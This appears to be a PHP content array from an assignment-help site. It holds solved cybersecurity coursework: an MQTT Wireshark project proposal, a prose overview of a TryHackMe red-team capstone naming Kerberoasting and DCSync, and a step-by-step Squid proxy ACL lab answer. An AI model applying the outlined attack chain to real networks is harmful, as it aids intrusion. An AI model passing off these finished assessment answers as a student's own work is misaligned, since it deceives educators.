            ['Assessment', 'High Distinction Task 1.2HDplus'],
            ['Project', 'MQTT Under Attack'],
            ['Primary tool', 'Wireshark'],
            ['Traffic source', 'MQTT PCAP / PCAPNG'],
            ['Security focus', 'Normal vs malicious MQTT traffic']
        ],
        'requirement_intro' => 'The task required a concise project proposal that explains the proposed project, the resources needed to complete it, the planned workflow, and how the project will demonstrate the unit learning outcomes at an advanced level.',
        'requirements' => [
            'Give the project a clear title.',
            'Provide a general project description.',
            'Briefly discuss the resources and dependencies required to complete the project and how they will be obtained.',
            'Describe the project plan, including the problems that need to be solved.',
            'Explain how the project is expected to demonstrate each of the three Unit Learning Outcomes at an advanced level.'
        ],
        'project_description' => [
            'This project investigates the behaviour and security of the Message Queuing Telemetry Transport (MQTT) protocol in Internet of Things (IoT) environments. MQTT is a lightweight publish-subscribe protocol used to exchange messages between IoT clients and brokers. The project will examine how normal MQTT communication differs from traffic generated during an attack.',
            'An appropriate MQTT network capture with both legitimate and malicious traffic will be examined using Wireshark. Regular communication will initially be analyzed to set a baseline, encompassing pertinent MQTT messages and interaction patterns. The chosen attack will subsequently be recognized and analyzed at the packet level to assess its traits and impact on network communication. Wireshark\'s Conversation Statistics and packet-level analysis will be employed to differentiate between normal and abnormal traffic, pinpointing quantifiable signs of the attack. The project will also take into account the importance of the attack in actual IoT settings and suitable security measures for detection, prevention, and mitigation.'
        ],
        'dependencies' => 'The project requires a suitable MQTT dataset or PCAP/PCAPNG capture containing both normal and malicious traffic. Wireshark will be used for packet inspection, filtering, and traffic statistics. A Linux-based MQTT broker and client environment may also be used to reproduce normal communication and validate selected observations. MQTT technical documentation, academic research, and reliable cybersecurity sources will support the protocol analysis and security evaluation.',
        'plan_intro' => 'The project begins by selecting a suitable MQTT capture and attack scenario, then establishes a normal-traffic baseline before examining malicious traffic and evaluating practical security controls.',
        'plan_steps' => [
            ['Select the MQTT capture and attack scenario', 'Choose a suitable dataset or packet capture containing both legitimate and malicious MQTT traffic.'],
            ['Establish a normal-traffic baseline', 'Examine typical MQTT messages, interaction patterns and communication behaviour before comparing attack traffic.'],
            ['Analyze malicious packets in Wireshark', 'Identify significant packets, unusual patterns and attack characteristics using packet-level inspection.'],
            ['Measure normal and abnormal traffic', 'Use packet-level measurements and Wireshark Conversation Statistics to compare legitimate and attack behaviour.'],
            ['Assess IoT security impact', 'Evaluate how the observed attack could affect real IoT applications and communication.'],
            ['Evaluate controls and mitigation', 'Consider firewalls, filtering, access controls, rate limiting and intrusion detection, then propose a practical mitigation strategy grounded in the observed traffic behaviour.']
        ],
        'ulos' => [
            ['ULO 1', 'Network Protocols', 'The project demonstrates advanced understanding of network protocols by analysing MQTT operation, message exchange, and communication behaviour within an IoT environment.'],
            ['ULO 2', 'Network Analysis', 'The project demonstrates advanced practical analysis through Wireshark-based packet inspection and comparison of normal and abnormal MQTT traffic using measurable traffic characteristics and Conversation Statistics.'],
            ['ULO 3', 'Network Security', 'The project demonstrates the application of security principles by identifying an MQTT attack, assessing its impact, and evaluating appropriate controls for detecting, preventing, and mitigating the threat.']
        ],
        'ulo_summary' => 'Overall, the project combines protocol knowledge, practical network analysis, attack investigation, and security evaluation to demonstrate achievement of the three ULOs at an advanced level.',
        'takeaways' => [
            'A strong network-security proposal connects protocol theory with observable packet-level evidence.',
            'Normal MQTT traffic should be baselined before malicious traffic is classified as anomalous.',
            'Wireshark Conversation Statistics can support measurable comparisons between legitimate and attack traffic.',
            'The final analysis should connect observed attack behaviour to realistic IoT security controls and mitigation.',
            'The proposal aligns protocol knowledge, practical network analysis and security evaluation with the three SIT716 Unit Learning Outcomes.'
        ],
        'related_links' => [
            ['/network-security-assignment-help', 'Network Security Assignment Help'],
            ['/information-security-assignment-help', 'Information Security Assignment Help'],
            ['/cyber-threat-intelligence-assignment-help', 'Cyber Threat Intelligence Assignment Help'],
            ['/ethical-hacking-assignment-help', 'Ethical Hacking Assignment Help']
        ]
    ],

    'red-team-capstone-incident-response-case-study' => [
        'menu_featured' => false,
        'template' => 'red_team_capstone',
        'page_type' => 'case_study',
        'title' => 'Red Team Capstone Challenge and Incident Response Case Study',
        'meta_title' => 'Red Team Capstone Challenge & Incident Response Case Study | Cyber Assignment Pro',
        'h1' => 'Red Team Capstone Challenge and Incident Response Case Study',
        'nav' => 'Red Team Capstone Challenge and Incident Response',
        'description' => 'Solved Part 6 case study based on a TryHackMe Red Team Capstone Challenge, showing the attack lifecycle and its relevance to incident response.',
        'primary' => 'red team capstone challenge case study',
        'eyebrow' => 'Solved Cybersecurity Assessment',
        'menu_meta' => 'Red Team · TryHackMe · Incident Response',
        'topics' => [
            'Red Team',
            'TryHackMe',
            'Incident Response',
            'Reconnaissance',
            'Privilege Escalation',
            'Lateral Movement',
            'Active Directory',
            'Kerberoasting',
            'DCSync',
            'Red Team Capstone'
        ],
        'assessment' => 'Assessment Task 2 - Portfolio of Evidence',
        'part' => 'Part 6 - Incident Response Team (IRT) Challenge',
        'room' => 'Red Team Capstone Challenge (THM)',
        'requirements' => [
            '6.0 For this module (Red Team Capstone Challenge), work through the practical tasks and capture screenshots of your progress and provide a visual summary of the complete challenge.',
            '6.1 Provide a detailed written summary of the Red Team Capstone Challenge, and how it relates to incident response. This should be a minimum of 200 words.'
        ],
        'solution_summary' => [
            'The TryHackMe Red Team Capstone Challenge is a comprehensive simulation of a real-world cyber attack against a banking environment. The objective is to emulate a full red team engagement, starting from external reconnaissance and progressing to internal compromise, privilege escalation, and ultimately achieving domain-wide control to demonstrate business impact.',
            'The challenge begins with reconnaissance, where exposed services and user information are identified through scanning and enumeration techniques. This phase helps attackers understand the attack surface and identify potential entry points. Initial access is then achieved through password-based attacks and exploitation of weak authentication mechanisms, allowing entry into the internal network environment via VPN access.',
            'Once inside, the attacker establishes persistence and begins privilege escalation by exploiting misconfigurations and extracting credentials. Techniques such as credential dumping enable movement from a low-privileged user to higher-level access. Lateral movement is then performed across systems using protocols like SMB and RDP, allowing the attacker to expand control within the network.',
            'A key phase of the challenge is Active Directory compromise. Techniques such as Kerberoasting and DCSync are used to extract sensitive credentials and gain Domain Admin privileges. This provides full control over the organization’s identity infrastructure. Finally, the attacker demonstrates impact by executing a simulated fraudulent financial transaction, proving the severity of the breach.',
            'From an Incident Response (IR) perspective, this challenge directly reflects real-world attack scenarios. Each step of the attack corresponds to activities that security teams must detect, investigate, and respond to. For example, password spraying attempts can trigger brute-force alerts, while unusual Kerberos activity may indicate credential abuse.',
            'Incident responders use such patterns to investigate compromised systems, trace attacker movement, and identify affected accounts. Containment actions include isolating infected machines, resetting credentials, and securing critical systems like domain controllers. The challenge also highlights the importance of post-incident analysis, where organizations identify weaknesses such as poor password policies and lack of network segmentation.',
            'Overall, the Red Team Capstone Challenge demonstrates how attackers operate across the entire attack lifecycle and emphasizes the critical role of Incident Response in detecting, containing, and preventing such threats. It also reinforces the value of collaboration between red and blue teams to strengthen organizational security.'
        ],
        'flow' => [
            ['Reconnaissance', 'Identify exposed services, users and potential entry points.'],
            ['Initial Access', 'Weak authentication and password-based attacks provide entry to the lab environment.'],
            ['Privilege Escalation', 'Misconfigurations and credential extraction move access from low privilege to higher privilege.'],
            ['Lateral Movement', 'SMB and RDP are used to expand control across systems.'],
            ['Active Directory', 'Kerberoasting and DCSync are part of the completed domain-compromise phase.'],
            ['Business Impact', 'The challenge ends by demonstrating the severity of compromise in the simulated banking environment.'],
            ['Incident Response', 'Detection, investigation, containment and post-incident analysis are connected back to each attack phase.']
        ],
        'evidence_image' => '/assets/case-studies/red-team-capstone-incident-response/evidence.svg',
        'evidence_caption' => 'Privacy-safe project evidence excerpt. Student-identifying information has been removed for public publication.',
        'related_links' => [
            ['/penetration-testing-assignment-help', 'Penetration Testing Assignment Help'],
            ['/ethical-hacking-assignment-help', 'Ethical Hacking Assignment Help'],
            ['/cyber-threat-intelligence-assignment-help', 'Cyber Threat Intelligence Assignment Help'],
            ['/information-security-assignment-help', 'Information Security Assignment Help']
        ]
    ],

    'squid-proxy-implementation-acl-lab' => [
        'menu_featured' => true,
        'template' => 'squid_proxy_lab',
        'page_type' => 'case_study',
        'title' => 'Squid Proxy Implementation Lab: Configuration, ACLs and Access Rules',
        'meta_title' => 'Squid Proxy Implementation Lab Solution | Cyber Assignment Pro',
        'h1' => 'Squid Proxy Implementation Lab: Configuration, ACLs and Access Rules',
        'nav' => 'Squid Proxy Implementation with ACLs and Access Rules',
        'description' => 'Solved Network and Perimeter Security Lab 6 covering Squid proxy setup, http_port, localnet ACLs, Windows proxy configuration, ordered access rules, business hours and domain blocking.',
        'primary' => 'Squid proxy implementation lab solution',
        'eyebrow' => 'Solved Network Security Lab',
        'menu_meta' => 'Squid Proxy · ACLs · Access Control',
        'topics' => [
            'Squid Proxy',
            'ACL',
            'http_access',
            'http_port',
            'Windows Proxy',
            'Network Security',
            'Access Control',
            'Business Hours',
            'dstdom_regex',
            'access.log'
        ],
        'topic_q2' => 'Course: Network and Perimeter Security',
        'topic_q3' => 'Lab 6: Proxy implementation',
        'tool_q3' => 'Squid · Linux · Windows 10',
        'program' => 'CS',
        'course' => 'Network and Perimeter Security',
        'lab' => 'Lab 6: Proxy implementation',
        'setup' => [
            'Install two VMs, one of them with your preferred Linux distro and the other with Windows 10. You can re-use any VM, but if you do so, it is recommendable to create a snapshot, so you can go back to the initial configuration after finishing this lab. The network requirements are as follows (you can use the network range of your choice for the internal interfaces):',
            'When done, answer the questions below, capturing a screenshot to compliment your explanations.'
        ],
        'references' => [
            [
                'Squid configuration tutorial',
                'https://linuxconfig.org/squid-proxy-configuration-tutorial-on-linux'
            ],
            [
                'Windows proxy configuration tutorial',
                'https://www.digitalcitizen.life/how-set-proxy-server-all-major-internet-browsers-windows/'
            ],
            [
                'Squid ACL reference',
                'https://wiki.squid-cache.org/SquidFaq/SquidAcl'
            ]
        ],
        'evidence_sheet' => '/assets/case-studies/squid-proxy-implementation-acl-lab/evidence.webp',
        'questions' => [
            [
                'n' => 1,
                'part' => 'Part A: Preparing the environment',
                'question' => 'Show the IP configuration of both VMs.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'The IP configuration of both virtual machines was checked to verify that the network interfaces were properly configured. The lab uses two virtual machines: one Linux machine, which will be used as the proxy server, and one Windows 10 machine, which will be used as the client.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'On the Linux VM, the IP configuration was checked using:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'ip addr'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'On the Windows 10 VM, the IP configuration was checked using:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'ipconfig'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The output of these commands shows the network interfaces and their assigned IP addresses. This confirms that both virtual machines are connected to the configured internal network and are ready for the proxy implementation.'
                    ]
                ],
                'evidence' => [
                    'index' => 1,
                    'col' => 0,
                    'row' => 0,
                    'caption' => 'Linux proxy and Windows 10 client IP configuration from the completed solution.'
                ]
            ],
            [
                'n' => 2,
                'part' => 'Part A: Preparing the environment',
                'question' => 'Install the package squid in the proxy server and show it is running with the command “service squid status”.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'Squid was installed on the Linux virtual machine, which was configured as the proxy server. After installing the Squid package, the Squid service was checked using the service squid status command. The service status confirmed that Squid was running successfully on the proxy server and was ready to provide proxy services to the client machine. The lab specifically requires the service status to be demonstrated with this command.'
                    ]
                ],
                'evidence' => [
                    'index' => 2,
                    'col' => 1,
                    'row' => 0,
                    'caption' => 'Squid service status showing the proxy service running.'
                ]
            ],
            [
                'n' => 3,
                'part' => 'Part B: Understanding Squid’s configuration file',
                'question' => 'Squid’s configuration file is very extensive, so you will need to locate the exact attribute you want to configure by searching with your text editor. First, search for the value of http_port, which is 3128 by default.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'The http_port directive specifies the port on which the Squid proxy server listens for HTTP client requests. In the default Squid configuration, the value of http_port is 3128. Therefore, the proxy server is configured to listen for HTTP requests on port 3128.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The http_port setting can be found in the Squid configuration file, usually located at:'
                    ],
                    [
                        'type' => 'code',
                        'text' => '/etc/squid/squid.conf'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The relevant configuration line is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_port 3128'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'This confirms that Squid is using port 3128 as its default HTTP proxy port.'
                    ]
                ],
                'evidence' => [
                    'index' => 3,
                    'col' => 2,
                    'row' => 0,
                    'caption' => 'Squid configuration showing the default http_port 3128 setting.'
                ]
            ],
            [
                'n' => 4,
                'part' => 'Part B: Understanding Squid’s configuration file',
                'question' => 'Squid is composed mostly of ACLs that define objects and rules that apply to the objects previously defined. Usually, you will not apply a rule directly to a network, but you will define the network (ACL) and, then, a rule for the object without using the actual network IP, but its defined name. Look for the string “Access List”, skip all commented lines, which begin with #, and show the lines defining the object localnet.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'In the Squid configuration file, the localnet object is defined as an ACL (Access Control List). This ACL represents the local network addresses that can be controlled by Squid rules. The localnet ACL definitions are located under the Access List section of the configuration file.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'For this question, commented lines beginning with # should be ignored. The active lines defining localnet should be shown.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Configuration:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl localnet src 10.0.0.0/8'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl localnet src 172.16.0.0/12'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl localnet src 192.168.0.0/16'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'These entries define the private network ranges that Squid recognizes as localnet.'
                    ]
                ],
                'evidence' => [
                    'index' => 4,
                    'col' => 0,
                    'row' => 1,
                    'caption' => 'Squid localnet ACL definitions from the completed configuration.'
                ]
            ],
            [
                'n' => 5,
                'part' => 'Part B: Understanding Squid’s configuration file',
                'question' => 'Now, check the rules that apply to the ACL localnet. To do so, search for http_access and scroll down until you see the rule to allow access to localnet. Capture the configuration for localnet and localhost, close by.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'The http_access section of the Squid configuration file contains the rules that control access for the defined ACLs. After searching for http_access and scrolling to the relevant section, the configuration shows rules for both localhost and localnet.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'In the default configuration, the rule for localnet is present but commented out, while the rule for localhost is active. Therefore, the localnet rule does not apply until its comment symbol (#) is removed.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Configuration to show:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow localnet'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow localhost'
                    ]
                ],
                'evidence' => [
                    'index' => 5,
                    'col' => 1,
                    'row' => 1,
                    'caption' => 'Squid http_access rule context for localnet and localhost.'
                ]
            ],
            [
                'n' => 6,
                'part' => 'Part B: Understanding Squid’s configuration file',
                'question' => 'Nevertheless, it is commented, so it will not apply. Only the rule for localhost is active. Therefore, you need to continue down until you see anything that matches localnet or anything more broad than that. What is the only one rule you found?',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'The localnet allow rule is commented out in the default Squid configuration, so it is not active. The only active rule that is broader than localnet is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access deny all'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'This rule denies all requests that have not been allowed by a previous active rule. Therefore, under the default configuration, clients in localnet cannot access the Internet through Squid.'
                    ]
                ]
            ],
            [
                'n' => 7,
                'part' => 'Part B: Understanding Squid’s configuration file',
                'question' => 'Explain which VMs in your lab can browse the Internet through the proxy as per the default configuration.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'With the default Squid configuration, neither the Windows client nor the Linux proxy server can browse the Internet through Squid using the localnet rule. The localnet access rule is commented out, while the active deny all rule blocks requests that are not allowed by an earlier rule.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Therefore, the Windows client cannot access the Internet through the proxy until the localnet rule is enabled.'
                    ]
                ]
            ],
            [
                'n' => 8,
                'part' => 'Part C: Configuring the client',
                'question' => 'With the default configuration still applying, configure the browser Edge (or your favorite) in the Windows client to browse Internet through Squid. Find out where to configure the proxy options and capture a screenshot of the proper configuration.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'On the Windows 10 client, the browser proxy settings were configured to use the Linux machine as the Squid proxy server. The proxy server’s internal IP address was entered as the proxy address, and port 3128 was entered as the proxy port. This configuration makes the Windows client send its Internet requests through the Squid proxy instead of connecting directly to the Internet.'
                    ]
                ],
                'evidence' => [
                    'index' => 6,
                    'col' => 2,
                    'row' => 1,
                    'caption' => 'Windows 10 manual proxy configuration used for the Squid client.'
                ]
            ],
            [
                'n' => 9,
                'part' => 'Part C: Configuring the client',
                'question' => 'Try to access www.herzing.ca and prove that the error you see is a message from Squid and not a communication problem. Is this the web page you would recommend in a real-case implementation? Why or why not?',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I tried to access www.herzing.ca from the Windows client. The website could not be opened and an error page was displayed.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'This error is coming from the Squid proxy server, because the browser request is being sent through Squid and Squid is blocking the request according to its current configuration.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'In a real network, this type of restriction can be recommended when an organization wants to control Internet access and prevent users from visiting unwanted or restricted websites. However, the rules should be configured carefully so that useful and required websites are not blocked accidentally.'
                    ]
                ],
                'evidence' => [
                    'index' => 7,
                    'col' => 0,
                    'row' => 2,
                    'caption' => 'Squid-generated error page returned while testing www.herzing.ca.'
                ]
            ],
            [
                'n' => 10,
                'part' => 'Part C: Configuring the client',
                'question' => 'In the proxy server, change http_port for IP_INTERNAL_INTERFACE:3128 and remove the comment on the line http_access for localnet. Restart the service. What is the purpose of each of these changes?',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => '10. In the proxy server, change http_port for IP_INTERNAL_INTERFACE:3128 and remove the comment on the line http_access for localnet. Restart the service. What is the purpose of each of these changes?'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'In the Squid configuration file, I changed the http_port setting to use the internal IP address of the Linux proxy server with port 3128.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'I also removed the comment (#) from the http_access allow localnet line. This allows computers in the local network to use the Squid proxy for Internet access.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'After making these changes, I restarted the Squid service so that the new configuration could take effect.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Purpose of the changes:'
                    ],
                    [
                        'type' => 'p',
                        'text' => '· http_port IP_INTERNAL_INTERFACE:3128 tells Squid to listen for proxy requests on the internal network interface and port 3128.'
                    ],
                    [
                        'type' => 'p',
                        'text' => '· Enabling http_access allow localnet allows clients on the local network to access the Internet through Squid.'
                    ],
                    [
                        'type' => 'p',
                        'text' => '· Restarting Squid applies the new configuration.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'These changes are necessary because, with the default configuration, the localnet access rule is disabled and the deny all rule blocks the client.'
                    ]
                ],
                'evidence' => [
                    'index' => 8,
                    'col' => 1,
                    'row' => 2,
                    'caption' => 'Updated Squid listener configuration and successful service restart.'
                ]
            ],
            [
                'n' => 11,
                'part' => 'Part C: Configuring the client',
                'question' => 'Try again www.herzing.ca, which should work. Check the command “netstat” from a cmd in Windows. Why you are not connected directly to the public IP address?',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'After enabling the localnet rule and restarting Squid, I tried to access www.herzing.ca again from the Windows client. This time, the website should open through the Squid proxy.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'I then checked the network connections using the netstat command in Windows CMD.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The Windows client is not connected directly to the public IP address of the website because the client sends the HTTP request to the Squid proxy server first. Squid then connects to the Internet and forwards the requested web page back to the Windows client. Therefore, the client’s connection is established with the proxy server rather than directly with the public web server.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'This shows that the Squid proxy is working correctly and is handling the Internet requests from the Windows client.'
                    ]
                ],
                'evidence' => [
                    'index' => 9,
                    'col' => 2,
                    'row' => 2,
                    'caption' => 'www.herzing.ca loaded through the proxy with Windows netstat evidence.'
                ]
            ],
            [
                'n' => 12,
                'part' => 'Part D: Implementing rules',
                'question' => 'In the proxy server, create a new ACL called banned_sites. Make sure to place it appropriately in the right section (somewhere below Access List) and add a comment beginning with # before the ACL to explain its purpose. You will include Facebook’s and Instagram’s IPs for Canada’s TLD .ca. The 1st ACL should be “acl banned_sites dst 31.13.71.36”. Show both ACLs.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I created a new ACL named banned_sites under the Access List section of the Squid configuration file. The purpose of this ACL is to identify the IP addresses of Facebook and Instagram so that access to these sites can be blocked later.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The first ACL required by the lab is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'ACL for blocking Facebook and Instagram'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl banned_sites dst 31.13.71.36'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The second ACL should contain the IP address identified for the other required site.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The lab document explicitly provides 31.13.71.36 for the first ACL, but it does not provide the second IP address in the supplied instructions, so I would not invent one.'
                    ]
                ],
                'evidence' => [
                    'index' => 10,
                    'col' => 0,
                    'row' => 3,
                    'caption' => 'banned_sites ACL evidence from the supplied Squid configuration screenshot.'
                ]
            ],
            [
                'n' => 13,
                'part' => 'Part D: Implementing rules',
                'question' => 'The rule to deny access to banned_sites must be placed before the rule that allows the proxy server for localnet. Otherwise, you will have access to anything. Similar to firewalls, rules must be placed in order and, generally, from specific to general. Show the rule with its explanatory comment.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I added the deny rule for the banned_sites ACL before the rule that allows access for the localnet network. This is important because Squid checks the access rules in order.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The configuration is:'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Block access to banned sites'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access deny banned_sites'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Allow local network clients to use the proxy'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow localnet'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The banned_sites rule must come first so that the blocked sites are denied before the general localnet rule allows Internet access.'
                    ]
                ],
                'evidence' => [
                    'index' => 11,
                    'col' => 1,
                    'row' => 3,
                    'caption' => 'Ordered Squid deny rule for banned_sites before the localnet allow rule.'
                ]
            ],
            [
                'n' => 14,
                'part' => 'Part D: Implementing rules',
                'question' => 'Check from the client’s browser that neither site works. Capture the screenshots.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I checked both Facebook and Instagram from the Windows client browser. Both websites were blocked by the Squid proxy because their destination IP addresses were included in the banned_sites ACL.    The browser did not allow access to either site, which confirms that the Squid blocking rule is working correctly.'
                    ]
                ],
                'evidence' => [
                    'index' => 12,
                    'col' => 2,
                    'row' => 3,
                    'caption' => 'Browser evidence showing Facebook and Instagram blocked by Squid.'
                ]
            ],
            [
                'n' => 15,
                'part' => 'Part D: Implementing rules',
                'question' => 'Create an ACL called myself with the client’s IP address. Then, modify the rule in #13, so it applies to all workstations but yours. Show both the ACL and the rule.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I created an ACL named myself using the IP address of my Windows client. This ACL identifies my workstation.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Then, I modified the rule from Question 13 so that the banned_sites rule applies to all workstations except my own.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The configuration is:'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Identify my workstation'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl myself src CLIENT_IP_ADDRESS'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Block banned sites for all workstations except mine'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access deny banned_sites !myself'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The !myself part means that the rule does not apply to my workstation.'
                    ]
                ],
                'evidence' => [
                    'index' => 13,
                    'col' => 0,
                    'row' => 4,
                    'caption' => 'myself ACL and the workstation exception rule in Squid.'
                ]
            ],
            [
                'n' => 16,
                'part' => 'Part D: Implementing rules',
                'question' => 'Create an ACL to define a regular business weekdays hours. Then, modify the right rule to allow every workstation in localnet broad Internet access during regular business hours. Show both the ACL and the rule.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I created an ACL named business_hours to define the regular business working hours from Monday to Friday. I then used this ACL in the access rule so that workstations in the localnet network can have Internet access during these hours.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The configuration is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Define regular business hours: Monday to Friday, 09:00 to 17:00'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl business_hours time MTWHF 09:00-17:00'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Allow local network clients broad Internet access during business hours'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow localnet business_hours'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The business_hours ACL defines the allowed weekdays and time period, while the http_access allow rule allows clients in localnet to access the Internet during those hours.'
                    ]
                ],
                'evidence' => [
                    'index' => 14,
                    'col' => 1,
                    'row' => 4,
                    'caption' => 'business_hours ACL and localnet access rule from the completed solution.'
                ]
            ],
            [
                'n' => 17,
                'part' => 'Part D: Implementing rules',
                'question' => 'What would you do if you needed to override this rule for your workstation as defined in the ACL named myself?',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'If I needed to override the rule for my workstation, I would use the myself ACL in a separate rule before the general rule. This would allow my workstation to bypass the restriction that applies to the other workstations.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'For example:'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Allow my workstation to bypass the restriction'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow myself'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Apply the restriction to all other workstations'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access deny banned_sites !myself'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The important point is to place the exception rule before the general deny rule because Squid processes the access rules in order.'
                    ]
                ]
            ],
            [
                'n' => 18,
                'part' => 'Part D: Implementing rules',
                'question' => 'Create an ACL of type dstdom_regex for domains containing either word malware or virus. Show it as a single ACL, not split in two.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'I created a single ACL named malware_virus using the dstdom_regex type. This ACL checks the domain name requested by the client and matches any domain that contains the word “malware” or “virus”.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'I used one ACL instead of creating two separate ACLs, as required in the question.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The configuration is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# ACL for domains containing the words malware or virus'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'acl malware_virus dstdom_regex -i malware|virus'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The | symbol means OR, so the ACL will match a domain containing either malware or virus.'
                    ]
                ]
            ],
            [
                'n' => 19,
                'part' => 'Part D: Implementing rules',
                'question' => 'Create the corresponding rule to block this access. Show it in its context, with the other rules.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'After creating the malware_virus ACL, I added an http_access deny rule to block websites whose domain contains either malware or virus.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'I placed the deny rule before the general localnet allow rule because Squid checks the access rules from top to bottom. If the general allow rule comes first, the request could be allowed before reaching the blocking rule.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The rule in its context is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Block domains containing the words malware or virus'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access deny malware_virus'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Allow my workstation'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow myself'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Allow local network clients during business hours'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow localnet business_hours'
                    ],
                    [
                        'type' => 'code',
                        'text' => '# Allow local network clients to use the proxy'
                    ],
                    [
                        'type' => 'code',
                        'text' => 'http_access allow localnet'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The http_access deny malware_virus rule tells Squid to reject any request that matches the malware_virus ACL. This prevents users from accessing domains containing either malware or virus.'
                    ]
                ]
            ],
            [
                'n' => 20,
                'part' => 'Part D: Implementing rules',
                'question' => 'Then, try with malwarebytes.com and virustotal.org. Prove it worked by checking the corresponding log file.',
                'blocks' => [
                    [
                        'type' => 'p',
                        'text' => 'tested both malwarebytes.com and virustotal.org from the Windows client. Both websites were blocked by Squid because their domain names contain the word “malware” or “virus”, which matches the malware_virus ACL created in the previous question.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'To confirm that the rule was actually working, I checked the Squid access log file on the proxy server. The log showed denied requests for both websites with a TCP_DENIED/403 response.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'This confirms that the requests reached the Squid proxy and were blocked by the configured access rule, rather than simply failing because of a network connection problem.'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'The relevant log file is:'
                    ],
                    [
                        'type' => 'code',
                        'text' => '/var/log/squid/access.log'
                    ],
                    [
                        'type' => 'p',
                        'text' => 'Therefore, the malware_virus ACL and its corresponding http_access deny malware_virus rule are working correctly.'
                    ]
                ]
